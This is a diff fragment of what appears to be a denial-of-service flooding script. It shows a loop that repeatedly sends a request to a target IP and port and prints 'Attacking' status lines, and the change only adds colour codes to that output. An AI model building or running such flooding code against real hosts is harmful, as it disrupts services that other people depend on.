@@ -97,7 +97,7 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m] \033[92mAttacking {0}:{1} | Sent: {2}\033[0m".format(str(ip), int(port), xx))
 
        except:
                s.close()
